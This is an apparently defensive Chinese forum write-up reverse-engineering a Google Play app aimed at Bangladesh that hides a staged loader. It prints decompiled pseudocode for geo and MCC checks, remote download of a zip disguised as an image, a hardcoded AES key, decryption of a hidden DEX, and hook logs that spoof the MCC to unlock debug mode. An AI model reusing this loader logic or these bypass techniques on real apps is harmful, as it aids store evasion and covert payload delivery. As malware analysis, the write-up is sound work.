> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-288789.htm)

> [原创] 谷歌上架之孟加拉马甲包逆向

app 启动调用 so
===========

```
public class PreformPriceInsist {
    public static native void tradeoffInvolvement(Context context);
 
    static {
        System.loadLibrary("tonalinfrequent");
    }
}

```

so 里面做检测时区, 检测通过后, 加载 so

```
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka
[+] TimeZone.getDefault() called - returning Bangladesh timezone
[+] TimeZone.getID() called - returning Asia/Dhaka

```

还做了什么检测没? 看看 jni

找不到导出函数, 通过 registe native 找下地址, 原来他的名字变成 molika 了

```
tradeoffInvolvement, signature: (Landroid/content/Context;)V, fnPtr: 0x77468a6bcc, modulename: libtonalinfrequent.so -> base: 0x774683a000, offset: 0x6cbcc

```

so 入口函数 - molika
================

mcc 是香港是调试模式

伪代码:

```
// 全局标志，可能用于特定区域的功能
bool is_debug_enabled = false;
 
void molika(JNIEnv* env, jobject self, jobject context) {
    // === 大量用于混淆的、无意义的文件I/O和线程操作在此省略 ===
 
    // 1. 检查移动国家代码 (MCC)
    if (getMcc(env, context) == 454) { // 454 = 香港
        is_debug_enabled = true;
        // ... 更多混淆代码 ...
    }
 
    // 2. 从远程源获取配置消息
    std::string message = fetchMsg(env, context);
 
    // 3. 如果没有消息，发送通知并退出
    if (message.empty()) {
        sendNotify(env, context, false); // 发送失败通知
        return;
    }
 
    // 4. 将消息分割成多个部分 (例如，按'|'分割 "part1|part2|part3")
    std::vector messageParts = splitString(message, "|");
 
    bool isRestricted = false;
    // 5. 如果消息有3个部分，则检查限制条件
    if (messageParts.size() == 3) {
        std::string zoneInfo = messageParts[2];
        if (zoneInfo != "*") {
            // 如果区域信息不是通配符，则检查当前设备是否在受限区域内
            if (check_mcc_zones(env, context, zoneInfo)) {
                isRestricted = true;
            }
        }
    } else {
        // 处理意外的消息格式，可能也视为受限
        isRestricted = true;
    }
 
    // 6. 根据限制状态执行不同逻辑
    if (isRestricted) {
        // --- 受限路径 ---
        __android_log_print(ANDROID_LOG_DEBUG, "C_LOG", "app is limited");
        sendNotify(env, context, false); // 发送失败通知
    } else {
        // --- 允许路径 ---
        startAnim(env, context); // 启动一个UI动画
 
        // 为后台主任务准备参数
        ThreadArgs* args = new ThreadArgs();
        args->context = env->NewGlobalRef(context);
        args->messageParts = messageParts;
 
        // 初始化MainLooper，用于后台线程与UI线程交互
        MainLooper::GetInstance()->init();
        MainLooper::GetInstance()->setEnv(env);
        MainLooper::GetInstance()->setContext(env->NewGlobalRef(context));
 
        // 在一个分离的后台线程中启动主要载荷
        pthread_t main_thread;
        pthread_create(&main_thread, nullptr, &thread_function, args);
        pthread_detach(main_thread); // 让它在后台自由运行，主函数不等待
    }
 
    // === 所有资源的最终清理工作在此省略 ===
} 
```

获取时区
====

```
__int64 __fastcall getTimeZoneInfo(__int64 a1)
{
  __int64 v2; // x22
  __int64 v3; // x23
  __int64 v4; // x0
  unsigned int v5; // w25
  _QWORD *lineIcNS_11char_traitsIcEENS_9allocatorIcEEEERNS_13basic_istrea; // x0
  FILE *stream; // x25
  int v8; // w24
  int v9; // w0
  int v10; // w25
  __int64 v11; // x23
  __int64 v12; // x0
  __int64 v13; // x22
  std::__thread_struct *v14; // x24
  std::__thread_struct **arg; // x0
  std::__ndk1 *v16; // x0
  const char *v17; // x2
  __int64 v18; // x21
  pthread_t newthread; // [xsp+8h] [xbp-1C8h] BYREF
  __int128 v21; // [xsp+10h] [xbp-1C0h] BYREF
  void *v22[2]; // [xsp+20h] [xbp-1B0h]
  __int64 v23; // [xsp+30h] [xbp-1A0h]
  _QWORD v24[2]; // [xsp+40h] [xbp-190h] BYREF
  _QWORD v25[15]; // [xsp+50h] [xbp-180h] BYREF
  FILE *stream_1; // [xsp+C8h] [xbp-108h]
  int n8; // [xsp+E8h] [xbp-E8h]
  _QWORD v28[18]; // [xsp+F8h] [xbp-D8h] BYREF
  int v29; // [xsp+188h] [xbp-48h]
  _BYTE v30[32]; // [xsp+190h] [xbp-40h] BYREF
  __int64 v31; // [xsp+1B0h] [xbp-20h]
  __int64 v32; // [xsp+1B8h] [xbp-18h]
 
  v32 = *(_QWORD *)(_ReadStatusReg(TPIDR_EL0) + 40);
  v31 = 0;
  memset(v30, 0, sizeof(v30));
  std::mutex::lock((std::mutex *)v30);
  v2 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 48LL))(a1, "java/util/TimeZone");
  v3 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 904LL))(
         a1,
         v2,
         "getDefault",
         "()Ljava/util/TimeZone;");
  v28[0] = off_111DB8;
  v24[1] = 0;
  std::ios_base::init((std::ios_base *)v28, v25);
  v28[17] = 0;
  v29 = -1;
  v24[0] = off_111D20;
  v28[0] = off_111D48;
  std::filebuf::basic_filebuf(v25);
  if ( stream_1 || (stream_1 = fopen("dummy.txt", "re")) == 0 )
  {
    std::ios_base::clear(
      (std::ios_base *)((char *)v24 + *(_QWORD *)(v24[0] + 0xFFFFFFFFFFFFFFE8LL)),
      *(_DWORD *)((char *)&v25[2] + *(_QWORD *)(v24[0] + 0xFFFFFFFFFFFFFFE8LL)) | 4);
    if ( !stream_1 )
      goto LABEL_13;
  }
  else
  {
    n8 = 8;
  }
  v21 = 0u;
  v22[0] = 0;
  do
  {
    std::ios_base::getloc(&newthread, (std::ios_base *)((char *)v24 + *(_QWORD *)(v24[0] - 24LL)));
    v4 = std::locale::use_facet((std::locale *)&newthread, (std::locale::id *)&std::ctype::id);
    v5 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 56LL))(v4, 10);
    std::locale::~locale((std::locale *)&newthread);
    lineIcNS_11char_traitsIcEENS_9allocatorIcEEEERNS_13basic_istrea = (_QWORD *)std::getline,std::allocator>(
                                                                                  v24,
                                                                                  &v21,
                                                                                  v5);
  }
  while ( (*((_BYTE *)lineIcNS_11char_traitsIcEENS_9allocatorIcEEEERNS_13basic_istrea
           + *(_QWORD *)(*lineIcNS_11char_traitsIcEENS_9allocatorIcEEEERNS_13basic_istrea - 24LL)
           + 32)
         & 5) == 0 );
  stream = stream_1;
  if ( !stream_1
    || (v8 = (*(__int64 (__fastcall **)(_QWORD *))(v25[0] + 48LL))(v25),
        v9 = fclose(stream),
        stream_1 = 0,
        v10 = v9,
        (*(void (__fastcall **)(_QWORD *, _QWORD, _QWORD))(v25[0] + 24LL))(v25, 0, 0),
        v10 | v8) )
  {
    std::ios_base::clear(
      (std::ios_base *)((char *)v24 + *(_QWORD *)(v24[0] - 24LL)),
      *(_DWORD *)((char *)&v25[2] + *(_QWORD *)(v24[0] - 24LL)) | 4);
  }
  if ( (v21 & 1) != 0 )
    operator delete(v22[0]);
LABEL_13:
  v11 = _JNIEnv::CallStaticObjectMethod(a1, v2, v3);
  v12 = (*(__int64 (__fastcall **)(__int64, __int64, const char *, const char *))(*(_QWORD *)a1 + 264LL))(
          a1,
          v2,
          "getID",
          "()Ljava/lang/String;");
  v13 = _JNIEnv::CallObjectMethod(a1, v11, v12);
  v14 = (std::__thread_struct *)operator new(8u);
  std::__thread_struct::__thread_struct(v14);
  arg = (std::__thread_struct **)operator new(8u);
  *arg = v14;
  v16 = (std::__ndk1 *)pthread_create(&newthread, 0, (void *(*)(void *))sub_89CE8, arg);
  if ( (_DWORD)v16 )
    std::__throw_system_error(v16, (int)"thread constructor failed", v17);
  std::thread::join((std::thread *)&newthread);
  v18 = jstringToChar(a1, v13);
  v23 = 0;
  v21 = 0u;
  *(_OWORD *)v22 = 0u;
  std::mutex::lock((std::mutex *)&v21);
  std::mutex::unlock((std::mutex *)&v21);
  std::mutex::~mutex((std::mutex *)&v21);
  std::thread::~thread((std::thread *)&newthread);
  v24[0] = off_111D20;
  v28[0] = off_111D48;
  std::filebuf::~filebuf(v25);
  std::istream::~istream(v24, off_111D60);
  std::ios::~ios(v28);
  std::mutex::unlock((std::mutex *)v30);
  std::mutex::~mutex((std::mutex *)v30);
  return v18;
} 
```

获取 MCC
======

```
/**
 * @brief 获取设备的移动国家代码 (MCC)。
 *
 * @param env JNI环境指针
 * @param context 一个Android Context对象的jobject
 * @return int - 返回整数形式的MCC，例如 460, 454。
 */
int getMcc(JNIEnv* env, jobject context) {
    // 1. 获取 Resources 对象: context.getResources()
    jclass contextClass = env->FindClass("android/content/Context");
    jmethodID getResourcesMethod = env->GetMethodID(contextClass, "getResources", "()Landroid/content/res/Resources;");
    jobject resourcesObj = env->CallObjectMethod(context, getResourcesMethod);
 
    // 2. 获取 Configuration 对象: resources.getConfiguration()
    jclass resourcesClass = env->FindClass("android/content/res/Resources");
    jmethodID getConfigurationMethod = env->GetMethodID(resourcesClass, "getConfiguration", "()Landroid/content/res/Configuration;");
    jobject configurationObj = env->CallObjectMethod(resourcesObj, getConfigurationMethod);
 
    // 3. 获取 Configuration 类中的 mcc 字段ID
    jclass configurationClass = env->FindClass("android/content/res/Configuration");
    jfieldID mccField = env->GetFieldID(configurationClass, "mcc", "I");
 
    // 4. 从 Configuration 对象中读取 mcc 字段的值
    int mcc = env->GetIntField(configurationObj, mccField);
 
    // 释放本地JNI引用...
 
    // 5. 返回MCC值
    return mcc;
}

```

通過分析发现把 mcc 改成香港, 可以打开调试模式

```
模块基地址: 0x774905a000
[+] 模块 libtonalinfrequent.so 已加载，地址: 0x774905a000
[+] 正在hook getMcc函数，地址: 0x77490dce68
[+] 拦截到getMcc函数调用
[*] 【C++函数getMcc】原始MCC: 0
[+] 【C++函数getMcc】已修改MCC为: 454 (香港)
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用TimeZone.getDefault() - 返回孟加拉国时区
[+] 调用TimeZone.getID() - 返回时区: Asia/Dhaka
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
webview加载 URL: [+] 调用NetworkCapabilities.hasTransport() - 类型: 1
[+] 返回true表示有WiFi网络
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
[+] 调用NetworkCapabilities.hasTransport() - 类型: 4
[+] 返回false表示无VPN网络
webview加载 URL: javascript: window.Android = window.Android || {};
webview加载 URL: javascript: window.Android.eventTracker = function(a,b){return window.js_bridge_2.js_method_2(a,b);};
webview加载 URL: javascript: window.Android.openWebView = function(a){window.js_bridge_2.js_method_3(a);};
webview加载 URL: javascript: window.Android = window.Android || {};
webview加载 URL: javascript: window.Android.eventTracker = function(a,b){return window.js_bridge_2.js_method_2(a,b);};
webview加载 URL: javascript: window.Android.openWebView = function(a){window.js_bridge_2.js_method_3(a);}; 
```

```
2025-07-23 16:47:34.935   843-843   C_LOG                   pid-843                              D  check_mcc_zones :Asia/Dhaka
2025-07-23 16:47:34.935   843-843   C_LOG                   pid-843                              I  startAnim
2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              D  第 1 部分: 2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              D  第 2 部分: 
2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              D  第 3 部分: America/Sao_Paulo,America/Manaus,America/Rio_Branco,America/Belem,America/Fortaleza,America/Araguaina,America/Bahia,America/Campo_Grande,America/Cuiaba,America/Santarem,America/Porto_Velho,America/Boa_Vista,America/Eirunepe,America/Noronha,America/Recife,America/Maceio,Brazil/DeNoronha,Asia/Manila,Asia/Ho_Chi_Minh,America/Mexico_City,America/Cancun,America/Merida,America/Monterrey,America/Matamoros,America/Mazatlan,America/Chihuahua,America/Ojinaga,America/Hermosillo,America/Tijuana,Asia/Pontianak,Asia/Makassar,Asia/Jakarta,Asia/Jayapura,Asia/Kolkata,Asia/Bangkok,Asia/Dhaka,Asia/Karachi
2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              D  filename -> 20250714_LB_051.png
2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              I  zip start decompressZip zipPath: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051.png
2025-07-23 16:47:34.956   843-1163  C_LOG                   pid-843                              I  Computed destDir: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 16:47:34.965   843-1163  C_LOG                   pid-843                              I  zip complete destDir: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 16:47:34.966   843-1163  C_LOG                   pid-843                              D  outputDir -> /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 16:47:34.966   843-1163  C_LOG                   pid-843                              D  configTxt -> /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051/20250714_LB_051.txt
2025-07-23 16:47:34.967   843-1163  C_LOG                   pid-843                              D  content -> {
                                                                                                        "isOpen": true,
                                                                                                        "isFullScreen": true,
                                                                                                        "isOffSound": false,
                                                                                                        "isRestart": false,
                                                                                                        "isRemoveAllViews": false,
                                                                                                        "isDelayedLoading": false,
                                                                                                        "mcc": "",
                                                                                                        "js": "javascript: window.Android = window.Android || {};<>javascript: window.Android.eventTracker = function(a,b){return window.js_bridge_2.js_method_2(a,b);};<>javascript: window.Android.openWebView = function(a){window.js_bridge_2.js_method_3(a);};",
                                                                                                        "horizontal_screen_B": 2,
                                                                                                        "timeZone": "Asia/Dhaka",
                                                                                                        "urlB": "",
                                                                                                        "adjust_token": "zlwb9189ct8g",
                                                                                                        "custom_event": [
                                                                                                            {
                                                                                                                "event_name": "deposit",
                                                                                                                "ad_event_id": "jswjdj"
                                                                                                            },
                                                                                                        {
                                                                                                                "event_name": "firstDepositArrival",
                                                                                                                "ad_event_id": "44wbx6"
                                                                                                            },
                                                                                                            {
                                                                                                                "event_name": "register",
                                                                                                                "ad_event_id": "i2oiv7"
                                                                                                            }
                                                                                                        ]
                                                                                                    }
2025-07-23 16:47:34.970   843-1163  C_LOG                   pid-843                              E  out_so_handle file is /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051/in_64.so 
```

第一个 so 的核心逻辑
============

```
初始化和参数解析 (Lines 1-177)
JNI环境附加：由于这是一个新线程，它首先需要调用 g_vm->AttachCurrentThread() 来获取当前线程的 JNIEnv* 指针，以便后续与Java层交互。
解析输入参数 a1：参数 a1 是一个结构体指针，包含了 _JNIEnv*, _jobject* (全局引用的Context) 和一个 std::vector（远程消息分段）。
提取消息部分：代码从 vector 中提取出两个关键的字符串，并存入 v496 和 v492（分别是URL和另一个参数）。如果vector大小不符合预期，则认为消息无效。
无效消息处理：如果解析出的URL为空，则认为消息无效，打印日志 "finalMsg is null"，调用 sendNotify(..., 0) 发送失败通知，然后线程退出。
2. 构造下载URL (Lines 178-212)
添加时间戳：获取当前系统时间 time(&timer)，并将其转换为字符串。
拼接URL：将 ?time= 和时间戳字符串拼接到从参数中解析出的URL后面。这样做通常是为了防止HTTP缓存。
生成缓存文件名：调用 getFilenameFromUrl 从完整的URL中提取出文件名，用于本地缓存。
构造缓存路径：调用 getCacheFilePath 将缓存文件名与应用的缓存目录拼接，得到一个完整的文件路径，存储在 CacheFilePathP7_JNIEnvP8_jobjectPc。
3. 密钥获取与缓存检查 (Lines 238-250)
获取密钥/时间戳：调用 getKey 函数。这个函数返回一个jstring，之后被转换成一个 long long 类型的数字 KeyP7_JNIEnvPKcS2_S2_。这很可能是一个上次成功操作的时间戳，存储在 SharedPreferences 中。
缓存有效性检查：执行一个关键判断 timer - KeyP7_JNIEnvPKcS2_S2_ < 7200 (即2小时)。
如果时间差小于2小时 并且 缓存文件存在 (!access(...))，则认为缓存有效，直接跳过下载步骤，跳转到 LABEL_428 去执行后续的解压和加载逻辑。
否则，继续执行下载流程。
4. 下载文件 (Lines 251-392)
下载：如果缓存无效，调用 downloadFile 函数，传入构造好的URL和本地缓存路径，执行文件下载。
下载失败处理：如果 downloadFile 返回失败 (false)，则打印失败日志，发送失败通知 sendNotify(..., 0)，然后线程退出。
下载成功处理：如果下载成功，继续执行。
5. 更新密钥/时间戳并解压 (Lines 393-448)
更新时间戳：调用 setKey 函数，将当前的时间戳 timer 存起来，供下次缓存检查使用。
解压文件：调用我们之前分析过的 decompressZip 函数，将下载好的缓存文件解压。解压后的目录路径存储在 v469 中。
解压失败处理：如果解压后的目录为空，则认为失败，发送失败通知，然后退出。
6. 解析配置文件和动态加载 (Lines 449-745)
查找配置文件：在解压目录中，调用 findFirstMatchFile 查找一个名字包含 .json 的文件。这很可能是动态模块的配置文件。
读取配置文件：如果找到了 .json 文件，调用 readFileContent 读取其内容。
解析JSON：调用 creatJsonObject 将文件内容解析成一个 jobject (Java层的JSONObject)。
判断CPU架构：通过JNI调用 Build.SUPPORTED_ABIS 获取设备的CPU架构列表，并检查第一个是否为 arm64-v8a。
查找对应的SO文件：根据CPU架构（64位或32位），在解压目录中查找名字包含 _64. 或 _32. 的文件。这显然是在寻找对应架构的动态库 (.so 文件)。
加载SO文件：使用 dlopen 加载找到的 .so 文件。
查找导出函数：使用 dlsym 在加载的句柄中查找一个名为 "biezheyang" 的函数。
加载失败处理：如果 dlopen 或 dlsym 失败，打印日志，发送失败通知，然后退出。
7. 执行核心功能 (Lines 690-701)
调用biezheyang：如果成功找到了 "biezheyang" 函数，就调用它 
```

第 2 个 so - 动态加载的 so in_64.so 或者 in_32.so
========================================

通过 url 下载 zip 包

解压后

![](https://bbs.kanxue.com/upload/attach/202510/846973_75DEFP5YJR3Y5N5.webp)

txt 是配置文件

打开第二个 so 的 debug 开关

```
check_mcc_zones :Asia/Dhaka
2025-07-23 17:43:51.583  8589-8589  C_LOG                   app.lsq.eluzipay                     I  startAnim
2025-07-23 17:43:51.604  8589-8757  C_LOG                   app.lsq.eluzipay                     D  第 1 部分: 2025-07-23 17:43:51.604  8589-8757  C_LOG                   app.lsq.eluzipay                     D  第 2 部分: 
2025-07-23 17:43:51.604  8589-8757  C_LOG                   app.lsq.eluzipay                     D  第 3 部分: America/Sao_Paulo,America/Manaus,America/Rio_Branco,America/Belem,America/Fortaleza,America/Araguaina,America/Bahia,America/Campo_Grande,America/Cuiaba,America/Santarem,America/Porto_Velho,America/Boa_Vista,America/Eirunepe,America/Noronha,America/Recife,America/Maceio,Brazil/DeNoronha,Asia/Manila,Asia/Ho_Chi_Minh,America/Mexico_City,America/Cancun,America/Merida,America/Monterrey,America/Matamoros,America/Mazatlan,America/Chihuahua,America/Ojinaga,America/Hermosillo,America/Tijuana,Asia/Pontianak,Asia/Makassar,Asia/Jakarta,Asia/Jayapura,Asia/Kolkata,Asia/Bangkok,Asia/Dhaka,Asia/Karachi
2025-07-23 17:43:51.605  8589-8757  C_LOG                   app.lsq.eluzipay                     D  filename -> 20250714_LB_051.png
2025-07-23 17:43:51.605  8589-8757  C_LOG                   app.lsq.eluzipay                     I  zip start decompressZip zipPath: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051.png
2025-07-23 17:43:51.605  8589-8757  C_LOG                   app.lsq.eluzipay                     I  Computed destDir: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 17:43:51.613  8589-8757  C_LOG                   app.lsq.eluzipay                     I  zip complete destDir: /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 17:43:51.613  8589-8757  C_LOG                   app.lsq.eluzipay                     D  outputDir -> /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051
2025-07-23 17:43:51.614  8589-8757  C_LOG                   app.lsq.eluzipay                     D  configTxt -> /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051/20250714_LB_051.txt
2025-07-23 17:43:51.614  8589-8757  C_LOG                   app.lsq.eluzipay                     D  content -> {
                                                                                                        "isOpen": true,
                                                                                                        "isFullScreen": true,
                                                                                                        "isOffSound": false,
                                                                                                        "isRestart": false,
                                                                                                        "isRemoveAllViews": false,
                                                                                                        "isDelayedLoading": false,
                                                                                                        "mcc": "",
                                                                                                        "js": "javascript: window.Android = window.Android || {};<>javascript: window.Android.eventTracker = function(a,b){return window.js_bridge_2.js_method_2(a,b);};<>javascript: window.Android.openWebView = function(a){window.js_bridge_2.js_method_3(a);};",
                                                                                                        "horizontal_screen_B": 2,
                                                                                                        "timeZone": "Asia/Dhaka",
                                                                                                        "urlB": "",
                                                                                                        "adjust_token": "zlwb9189ct8g",
                                                                                                        "custom_event": [
                                                                                                            {
                                                                                                                "event_name": "deposit",
                                                                                                                "ad_event_id": "jswjdj"
                                                                                                            },
                                                                                                        {
                                                                                                                "event_name": "firstDepositArrival",
                                                                                                                "ad_event_id": "44wbx6"
                                                                                                            },
                                                                                                            {
                                                                                                                "event_name": "register",
                                                                                                                "ad_event_id": "i2oiv7"
                                                                                                            }
                                                                                                        ]
                                                                                                    }
2025-07-23 17:43:51.616  8589-8757  C_LOG                   app.lsq.eluzipay                     E  out_so_handle file is /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051/in_64.so
2025-07-23 17:43:51.617  8589-8757  C_LOG                   app.lsq.eluzipay                     D  data -> {
                                                                                                        "isOpen": true,
                                                                                                        "isFullScreen": true,
                                                                                                        "isOffSound": false,
                                                                                                        "isRestart": false,
                                                                                                        "isRemoveAllViews": false,
                                                                                                        "isDelayedLoading": false,
                                                                                                        "mcc": "",
                                                                                                        "js": "javascript: window.Android = window.Android || {};<>javascript: window.Android.eventTracker = function(a,b){return window.js_bridge_2.js_method_2(a,b);};<>javascript: window.Android.openWebView = function(a){window.js_bridge_2.js_method_3(a);};",
                                                                                                        "horizontal_screen_B": 2,
                                                                                                        "timeZone": "Asia/Dhaka",
                                                                                                        "urlB": "",
                                                                                                        "adjust_token": "zlwb9189ct8g",
                                                                                                        "custom_event": [
                                                                                                            {
                                                                                                                "event_name": "deposit",
                                                                                                                "ad_event_id": "jswjdj"
                                                                                                            },
                                                                                                        {
                                                                                                                "event_name": "firstDepositArrival",
                                                                                                                "ad_event_id": "44wbx6"
                                                                                                            },
                                                                                                            {
                                                                                                                "event_name": "register",
                                                                                                                "ad_event_id": "i2oiv7"
                                                                                                            }
                                                                                                        ]
                                                                                                    }
2025-07-23 17:43:51.617  8589-8757  C_LOG                   app.lsq.eluzipay                     D  sdkFile -> /data/user/0/app.lsq.eluzipay/cache/.nbXe7HODl/20250714_LB_051/sdk_47_ad_af.jpg
2025-07-23 17:43:51.617  8589-8757  C_LOG                   app.lsq.eluzipay                     E  get deFilePath: /data/user/0/app.lsq.eluzipay/cache/start
2025-07-23 17:43:51.617  8589-8757  C_LOG                   app.lsq.eluzipay                     E  file starting decrypt.... deFilePath: /data/user/0/app.lsq.eluzipay/cache/start
2025-07-23 17:43:51.619  8589-8757  C_LOG                   app.lsq.eluzipay                     E  /data/user/0/app.lsq.eluzipay/cache/start file is decrypted
2025-07-23 17:43:51.622  8589-8757  C_LOG                   app.lsq.eluzipay                     E  com/ggaab123/da5252/abdkdisskk/ApiUtils dex load is start ...... 
```

第二次打印的配置是传进来的

第 2 个 so 的主要逻辑
==============

1.  **查找加密资源**：在 thread_function 解压出的目录中，查找一个以 sdk_ 开头的文件。这个文件是**加密的核心 dex 名称是: sdk_47_ad_af.jpg**。
2.  **解密资源**：使用一个硬编码的 AES 密钥 "d1r7oISRSnot8y8AkDr539PyE5sCUdfL" 来解密找到的 sdk_ 文件。解密后的文件保存在应用的缓存目录 / app.lsq.eluzipay/cache/start 文件中
3.  **动态加载 DEX**：使用 DexClassLoader 来加载解密后的 DEX 文件。
4.  **反射调用**：通过反射机制，从加载的 DEX 中找到一个名为 com.ggaab123.da5252.abdkdisskk.ApiUtils 的类。
5.  **执行入口方法**：调用这个类的静态方法 start，并将 Context、一个 Dialog 对象（从 molika 一路传递下来）以及一个 JSON 配置字符串作为参数传入。
6.  **清理工作**：执行完毕后，删除解密后的 DEX 文件和之前解压的整个目录，实现 “雁过无痕”

```
// a1: JNIEnv*
// a2: jobject (Context)
// a3: jstring (JSON配置字符串)
// a4: jobject (Dialog)
// a5: C字符串 (thread_function解压出的目录路径)
__int64 __fastcall comeOn(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
    // ... 局部变量声明 ...
 
    // 1. 查找加密的SDK文件
    // name = "sdk_"
    name = 8;
    strcpy(sdk__, "sdk_");
    // 在解压目录(a5)下查找第一个名字包含 "sdk_" 的文件
    findFirstMatchFile(v20, a5, &name);
 
    // ... 调试日志和有效性检查 ...
    // 如果没有找到文件，或文件路径为空，直接失败并退出
    if (path_is_empty) {
        goto LABEL_44; // 跳转到失败处理
    }
 
    // 将找到的文件路径拷贝到本地缓冲区 dest
    strncpy(dest, src_2, 0xC7u);
    dest[199] = 0;
 
    // 2. 构造解密后的文件路径
    // 构造一个目标文件名 "/start"
    memset(v25, 0, 60);
    LOBYTE(v25[0]) = 47;
    __strcat_chk(v25, "start", 60);
    // 获取缓存目录下的路径，例如 /data/data/com.app/cache/start
    CacheFilePathP7_JNIEnvP8_jobjectPc = getCacheFilePath(a1, a2, v25);
    __strcpy_chk(&name, CacheFilePathP7_JNIEnvP8_jobjectPc, 200);
     
    // 3. 解密文件
    // 如果解密后的文件不存在 (access返回非0)
    if (access(&name, 0)) {
        // 调用 decryptFile 函数进行解密
        // 密钥是硬编码的 "d1r7oISRSnot8y8AkDr539PyE5sCUdfL"
        // dest 是加密文件的路径, &name 是解密后文件的输出路径
        if ((decryptFile(a1, "d1r7oISRSnot8y8AkDr539PyE5sCUdfL", dest, &name) & 1) == 0) {
            // 如果解密失败，再尝试一次
            if ((decryptFile(a1, "d1r7oISRSnot8y8AkDr539PyE5sCUdfL", dest, &name) & 1) == 0) {
                // 两次都失败，则跳转到失败处理
                goto LABEL_44;
            }
        }
    }
 
    // 再次检查解密后的文件是否存在，如果不存在，则失败
    if (access(&name, 0)) {
        goto LABEL_44;
    }
     
    // 4. 设置文件权限为只读
    setOnlyRead(a1, &name);
 
    // 5. 动态加载DEX
    // 创建一个 DexClassLoader 实例来加载解密后的文件(&name)
    DexClassLoaderP7_JNIEnvP8_jobjectPKc = getDexClassLoader(a1, a2, &name);
    if (!DexClassLoaderP7_JNIEnvP8_jobjectPKc) {
        goto LABEL_44;
    }
 
    // 6. 反射调用
    // a. 获取 DexClassLoader 的 loadClass 方法
    v14 = (*(JNIEnv**)a1)->GetObjectClass(a1, DexClassLoaderP7_JNIEnvP8_jobjectPKc);
    v15 = (*(JNIEnv**)a1)->GetMethodID(a1, v14, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
 
    // b. 加载目标类 "com/ggaab123/da5252/abdkdisskk/ApiUtils"
    jstring className = (*(JNIEnv**)a1)->NewStringUTF(a1, "com.ggaab123.da5252.abdkdisskk/ApiUtils");
    jclass apiUtilsClass = (*(JNIEnv**)a1)->CallObjectMethod(a1, DexClassLoaderP7_JNIEnvP8_jobjectPKc, v15, className);
    v17 = apiUtilsClass;
     
    if (v17) {
        // c. 获取目标类的静态方法 start
        v18 = (*(JNIEnv**)a1)->GetStaticMethodID(
            a1,
            v17, // ApiUtils Class
            "start",
            "(Landroid/content/Context;Ljava/lang/Object;Ljava/lang/String;)V"
        );
         
        // d. 调用 start 方法
        // 将 a2(Context), a4(Dialog), a3(JSON String) 作为参数传入
        jstring jsonConfig = (*(JNIEnv**)a1)->NewStringUTF(a1, a3);
        (*(JNIEnv**)a1)->CallStaticVoidMethod(a1, v17, v18, a2, a4, jsonConfig);
 
        // 7. 清理工作
        // 删除解密后的DEX文件
        remove(&name);
        // 删除整个解压目录
        result = deleteDirectory(a5);
    } else {
        // 类加载失败处理
        ...
    }
 
LABEL_44:
    // 失败处理路径
    result = sendNotify(a1, a2, 0); // 发送失败通知
 
LABEL_47:
    // 清理 v20 (findFirstMatchFile 返回的字符串)
    ...
    return result;
}

```

dex 文件 start
============

![](https://bbs.kanxue.com/upload/attach/202510/846973_EZWXDMHU7T3VFHB.webp)

```
public static void start(Context context0, Object object0, String s) {
    String s2;
    // 获取移动国家代码 (MCC)
    int v = context0.getResources().getConfiguration().mcc;
    // 如果 MCC 为 454 (香港)，设置 j.b 为 true
    if(v == 454) {
        j.b = true;
    }
 
    // 记录 MCC 值
